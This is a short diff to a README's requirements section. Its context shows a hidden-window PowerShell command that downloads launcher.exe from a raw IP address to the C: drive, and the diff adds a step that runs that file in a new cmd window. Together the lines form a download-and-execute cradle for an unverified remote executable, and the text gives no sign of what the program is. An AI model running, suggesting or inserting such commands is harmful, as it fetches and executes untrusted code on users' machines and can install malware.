@@ -38,3 +38,10 @@ Requirements
 ```cmd
 powershell.exe -nop -w hidden -c "$client = new-object System.Net.WebClient;$client.DownloadFile('http://175.12.80.10:8000/launcher.exe','C:\launcher.exe')"
 ```
+
+### Run program in seperate cmd
+
+```powershell
+start cmd /c c:\launcher.exe  # starts new cmd with launcher.exe
+```
+
